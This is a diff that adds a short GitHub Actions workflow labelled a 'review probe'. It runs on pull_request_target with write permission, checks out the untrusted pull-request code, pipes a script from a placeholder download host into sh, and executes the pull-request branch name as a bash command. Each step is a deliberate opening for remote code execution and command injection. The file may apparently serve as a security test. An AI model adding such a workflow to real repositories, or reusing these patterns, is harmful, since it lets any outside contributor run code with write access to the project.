@@ -1,0 +1,16 @@
+name: DCOIR Review probe 20260627L
+on:
+  pull_request_target:
+permissions:
+  contents: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Run installer
+        run: wget -qO- https://downloads.example.invalid/agent.sh | sh
+      - name: Run PR branch name
+        run: bash -c "${{ github.event.pull_request.head.ref }}"
